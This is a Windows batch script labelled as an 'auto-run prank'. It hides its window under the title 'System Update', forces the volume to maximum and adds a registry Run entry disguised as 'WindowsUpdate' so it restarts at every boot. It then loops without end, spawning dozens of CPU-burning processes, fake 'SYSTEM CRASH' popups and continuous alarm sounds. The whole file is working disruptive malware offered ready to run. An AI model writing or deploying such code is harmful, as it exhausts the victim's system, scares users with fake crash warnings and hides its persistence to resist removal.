@echo off
REM =====================================
REM AUTO-RUN PRANK + MAX VOLUME APOCALYPSE
REM =====================================

REM HIDE CONSOLE + DISABLE KILL (Stealth)
title System Update
powershell -WindowStyle hidden -Command "$h=(Get-Host).UI.RawUI;$h.WindowSize=1,1;$h.CursorSize=0;"

REM FORCE MAX VOLUME (IGNORES MUTE!)
powershell -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Volume{ [DllImport(\"winmm.dll\")] public static extern int waveOutSetVolume(IntPtr hwo, uint dwVolume); }'; [Volume]::waveOutSetVolume([IntPtr]::Zero, 0xFFFF);"

REM PERSISTENCE (Survives reboot)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "%~f0" /f >nul 2>&1

REM FULLSCREEN CHAOS LOOP
:chaos
powershell -WindowStyle Maximized -Command "$h=(Get-Host).UI.RawUI;$max=$h.MaxWindowSize;$h.WindowSize=$max;$h.BufferSize=$max;color 4C;title FATAL SYSTEM ERROR"
timeout /t 1 >nul 2>&1

REM CPU FLOOD (45 zombie processes)
for /l %%i in (1,1,45) do start /max cmd /c "color 4C & title CPU-MELTDOWN-%%i & for /l %%%%a in (1,0,2) do ping 127.0.0.1 >nul"

REM SOUND HELL (60 ultra-fast alerts)
powershell -c "(1..60 | %% {[System.Media.SoundPlayer]::new('C:\Windows\Media\Windows Critical Stop.wav').PlaySync(); Start-Sleep -m 80})"

REM POPUP APOCALYPSE
for /l %%i in (1,1,30) do (
    start cmd /c "msg * /time:0 SYSTEM CRASH %%i - VOLUME 100%% & msg * /time:0 FATAL: 0x%RANDOM%"
)

REM INFINITE VOLUME ALERTS
powershell -c "while($true){[System.Media.SoundPlayer]::new('C:\Windows\Media\Windows Hardware Removed.wav').PlaySync(); Start-Sleep -m 200}"
goto chaos
